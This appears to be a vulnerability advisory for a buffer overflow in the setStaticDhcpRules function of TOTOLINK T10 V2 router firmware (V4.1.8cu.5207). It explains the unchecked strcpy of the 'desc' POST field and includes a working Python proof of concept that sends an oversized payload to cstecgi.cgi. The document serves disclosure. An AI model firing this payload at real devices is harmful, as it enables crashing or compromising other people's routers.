## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://totolink.com.my/products/t10/

## Affected version

T10 V2_Firmware V2_V4.1.8cu.5207

## Vulnerability details

In the T10 V2_Firmware V2_V4.1.8cu.5207 firmware has a buffer overflow vulnerability in the `setStaticDhcpRules` function. The `v5` variable receives the `desc` parameter from a POST request. However, since the user can control the input of `desc`, the `strcpy` can cause a buffer overflow vulnerability.

![image-20240902134915171](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240902134915171.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {
"topicurl":"setStaticDhcpRules",
"addEffect":1,
"desc":"b"*0x1000,
}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721015356613](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721015356613.png)
